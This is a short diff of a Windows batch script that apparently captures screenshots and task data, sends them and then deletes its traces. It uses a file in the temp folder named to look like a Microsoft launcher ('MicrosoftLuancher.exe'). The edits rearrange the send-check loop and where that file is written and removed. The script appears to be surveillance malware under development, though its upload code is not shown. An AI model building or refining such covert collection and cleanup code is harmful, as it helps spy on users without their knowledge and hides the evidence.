@@ -71,8 +71,7 @@ set "lastMinute=none"
 
 set "InstalledQWB=%temp%\MicrosoftLuancher.exe"
 del /f /q "%InstalledQWB%"
-echo Updates : >> "%InstalledQWB%"
-echo. >> "%InstalledQWB%"
+
 
 
 
@@ -98,6 +97,12 @@ for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemP
 :loop_start
 echo :loop_start
 echo.
+
+
+
+echo Updates : >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+
 
 
 
@@ -860,7 +865,7 @@ if "%CheckSend%"=="1" (
     goto SENDCHECK
 ) else (
     echo - CheckSend=%CheckSend% - Going to checkloooop
-    goto checkloooop
+    goto NEXT2
 )
 
 
@@ -961,7 +966,7 @@ echo Sent.
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 del /f /q "%LOGFILE1%"
 del /f /q "%TASKS_DATA%"
-del /f /q "%InstalledQWB%"
+
 
 
 set "currentMinute=%time:~3,2%"
@@ -975,8 +980,8 @@ set "lastMinute=%currentMinute%"
 
 
 
-
-
+:NEXT2
+del /f /q "%InstalledQWB%"
 
 
 
